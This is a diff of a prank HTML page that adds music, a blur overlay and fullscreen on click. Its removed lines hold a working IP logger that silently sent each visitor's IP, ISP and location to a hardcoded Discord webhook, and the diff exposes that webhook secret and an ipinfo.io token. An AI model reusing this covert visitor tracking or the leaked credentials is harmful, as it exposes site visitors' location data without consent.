@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>JSON Viewer</title>
+    <title>grub</title>
     <link rel="stylesheet" href="particles.css">
     <style>
         body {
@@ -26,6 +26,7 @@
             box-sizing: border-box;
             text-align: left;
             margin-left: 0;
+            filter: blur(5px);
         }
         code {
             color: #e6e6e6;
@@ -39,15 +40,61 @@
             border-radius: 50%;
             transform: translate(-50%, -50%);
         }
+        .blur-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.7);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: #fff;
+            font-size: 24px;
+            z-index: 9999;
+            opacity: 1;
+            transition: opacity 0.5s;
+        }
+        .new-container {
+            background-color: #1e1e1e;
+            padding: 10px;
+            margin-top: 20px;
+            border-radius: 8px;
+            color: #fff;
+            text-align: center;
+            filter: blur(5px);
+            cursor: pointer;
+            position: fixed;
+            bottom: 40px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 200px;
+            text-align: center;
+            box-sizing: border-box;
+        }
+        .draggable {
+            width: 100%;
+            text-align: center;
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+        }
     </style>
 </head>
 <body>
+    <div id="blur-overlay" class="blur-overlay">Click anywhere</div>
     <div class="animation-wrapper">
         <div class="particle particle-1"></div>
     </div>
     <pre><code id="json-output"></code></pre>
-
+    <div class="new-container" id="draggable-bar">
+        <div class="draggable">CRAZY</div>
+    </div>
+    <audio id="audio-player" src="crazy.mp3" preload="auto"></audio>
     <script>
+        let isFirstClick = true;
+
         const colors = [
             "#ff6347", "#32cd32", "#ffeb3b", "#1e90ff", "#ff4500", "#d2691e", "#8a2be2",
             "#00bfff", "#ff1493", "#ff4500", "#c71585", "#ffd700", "#adff2f", "#ff69b4", "#8b0000"
@@ -71,42 +118,6 @@
             });
         }
 
-        function sendToDiscord(data) {
-            const webhookUrl = "https://discord.com/api/webhooks/1321425715282968586/6WIZ_SLHzIOb7_I57c79dbC1um_0zLk_sXf3D2XdSZTE2-Zjpjpc0GkBEHn8dX6uwNUt";
-
-            const embedData = {
-                embeds: [{
-                    title: "IP Information",
-                    description: "- gator was here",
-                    color: 0x757e8a,
-                    fields: [
-                        { name: "IP", value: `\`\`\`${data.ip}\`\`\``, inline: true },
-                        { name: "Host", value: `\`\`\`${data.hostname}\`\`\``, inline: true },
-                        { name: "City", value: `\`\`\`${data.city || "Unknown City"}\`\`\``, inline: true },
-                        { name: "Region", value: `\`\`\`${data.region || "Unknown Region"}\`\`\``, inline: true },
-                        { name: "Country", value: `\`\`\`${data.country || "Unknown Country"}\`\`\``, inline: true },
-                        { name: "Location", value: `\`\`\`${data.loc || "Unknown Location"}\`\`\``, inline: true },
-                        { name: "ISP", value: `\`\`\`${data.org || "Unknown ISP"}\`\`\``, inline: true },
-                        { name: "AS Number", value: `\`\`\`${data.as || "N/A"}\`\`\``, inline: true },
-                        { name: "Timezone", value: `\`\`\`${data.timezone || "Unknown Timezone"}\`\`\``, inline: true },
-                        { name: "Type", value: `\`\`\`IPV4\`\`\``, inline: true }
-                    ]
-                }]
-            };
-
-            fetch(webhookUrl, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(embedData)
-            }).then(response => {
-                if (response.ok) {
-                    console.log("Data sent to Discord");
-                } else {
-                    console.error("Error sending data to Discord", response);
-                }
-            }).catch(error => console.error("Error sending webhook:", error));
-        }
-
         window.onload = () => {
             fetch('https://ipinfo.io?token=0257f913040cf7')
                 .then(response => response.json())
@@ -114,7 +125,7 @@
                     const hostIP = data.ip || "Unknown IP";
                     const hostName = data.hostname || "Unknown Hostname";
                     const jsonData = {
-                        "how'd you get here!": "theres nothing on this website, trust me...",
+                        "welcome": "to hell",
                         "isActive": true,
                         "count": 42,
                         "location": hostIP,
@@ -127,16 +138,18 @@
                         "AS Number": data.as || "N/A",
                         "Timezone": data.timezone || "Unknown Timezone",
                         "Type": "IPV4",
-                        "SentToDiscord": "true",
+                        "Playing": "CRAZY - LE SSERAFIM",
                     };
 
-                    sendToDiscord(data); // Send to Discord immediately
                     document.getElementById('json-output').innerHTML = highlightJson(jsonData);
+
+                    const audioPlayer = document.getElementById('audio-player');
+                    audioPlayer.pause();
                 })
                 .catch(error => {
                     console.error("Error fetching location:", error);
                     const jsonData = {
-                        "how'd you get here!": "theres nothing on this website, trust me...",
+                        "welcome": "to hell",
                         "isActive": true,
                         "count": 42,
                         "location": "Unable to fetch location",
@@ -149,9 +162,8 @@
                         "AS Number": "N/A",
                         "Timezone": "Unknown Timezone",
                         "Type": "IPV4",
-                        "SentToDiscord": "true",
+                        "Playing": "CRAZY - LE SSERAFIM",
                     };
-                    sendToDiscord(jsonData); // Send fallback data to Discord
                     document.getElementById('json-output').innerHTML = highlightJson(jsonData);
                 });
         };
@@ -169,6 +181,51 @@
             setTimeout(() => {
                 particle.remove();
             }, 300);
+        });
+
+        document.getElementById("blur-overlay").addEventListener("click", function() {
+            document.getElementById("blur-overlay").style.opacity = 0;
+            document.querySelector("pre").style.filter = "blur(0px)";
+            document.querySelector(".new-container").style.filter = "blur(0px)";
+            setTimeout(() => {
+                document.getElementById("blur-overlay").style.display = "none";
+            }, 500);
+
+            if (document.documentElement.requestFullscreen) {
+                document.documentElement.requestFullscreen();
+            } else if (document.documentElement.mozRequestFullScreen) {
+                document.documentElement.mozRequestFullScreen();
+            } else if (document.documentElement.webkitRequestFullscreen) {
+                document.documentElement.webkitRequestFullscreen();
+            } else if (document.documentElement.msRequestFullscreen) {
+                document.documentElement.msRequestFullscreen();
+            }
+
+            const audioPlayer = document.getElementById('audio-player');
+            audioPlayer.play();
+            document.querySelector('.draggable').innerText = "i love chaewon"; 
+        });
+
+        document.addEventListener('keydown', function(event) {
+            if (event.code === 'Space') {
+                const audioPlayer = document.getElementById('audio-player');
+                const jsonOutput = document.getElementById('json-output');
+                const currentJson = JSON.parse(jsonOutput.innerText); 
+
+                if (audioPlayer.paused) {
+                    audioPlayer.play();
+                    currentJson.Playing = "CRAZY - LE SSERAFIM";
+                    currentJson.Paused = undefined;
+                    document.querySelector('.draggable').innerText = "im CRAZY for chaewon"; 
+                } else {
+                    audioPlayer.pause();
+                    currentJson.Paused = "CRAZY - LE SSERAFIM";
+                    currentJson.Playing = undefined;
+                    document.querySelector('.draggable').innerText = "i really love chaewon"; 
+                }
+
+                document.getElementById('json-output').innerHTML = highlightJson(currentJson);
+            }
         });
     </script>
 </body>
